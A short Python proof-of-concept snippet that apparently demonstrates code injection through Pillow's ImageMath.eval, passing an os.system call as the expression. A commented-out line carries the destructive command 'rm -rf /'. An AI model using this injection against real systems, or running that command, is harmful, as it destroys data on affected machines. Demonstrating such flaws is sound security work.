from PIL import ImageMath

# Vulnerable code
expression = "os.system('rm -rf nonexistingfile')"
#expression = "os.system('rm -rf /')"  # Malicious command CAREFUL!
ImageMath.eval(expression )